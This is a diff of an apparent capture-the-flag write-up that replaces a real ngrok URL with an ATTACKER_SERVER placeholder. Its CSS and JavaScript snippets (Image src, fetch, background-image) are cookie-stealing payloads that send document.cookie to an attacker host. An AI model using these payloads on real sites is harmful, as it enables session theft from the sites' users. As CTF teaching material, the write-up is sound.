@@ -75,7 +75,7 @@ We get a hit for the `/css/ocean.css` file (meaning we don't control the file ex
 {% code overflow="wrap" %}
 ```css
 body {
-    background-image: url("https://4ad824cfde68.ngrok-free.app?flag=meow");
+    background-image: url("https://ATTACKER_SERVER?flag=meow");
 }
 ```
 {% endcode %}
@@ -89,7 +89,7 @@ Unfortunately, I tried various payloads to execute JS here, e.g.
 {% code overflow="wrap" %}
 ```css
 body {
-    background-image: url("https://4ad824cfde68.ngrok-free.app?flag=" + document.cookie);
+    background-image: url("https://ATTACKER_SERVER?flag=" + document.cookie);
 }
 ```
 {% endcode %}
@@ -99,7 +99,7 @@ These resulted in no request being made to the attacker server (not just a missi
 {% code overflow="wrap" %}
 ```javascript
 var img = new Image();
-img.src = "https://4ad824cfde68.ngrok-free.app?flag=" + document.cookie;
+img.src = "https://ATTACKER_SERVER?flag=" + document.cookie;
 ```
 {% endcode %}
 
@@ -119,7 +119,7 @@ I tried a variety of payloads/formats here but each had the same issue, e.g.
 
 {% code overflow="wrap" %}
 ```javascript
-fetch("https://4ad824cfde68.ngrok-free.app?flag=" + document.cookie, {
+fetch("https://ATTACKER_SERVER?flag=" + document.cookie, {
     method: "GET",
     headers: {
         "Content-Type": "application/json",
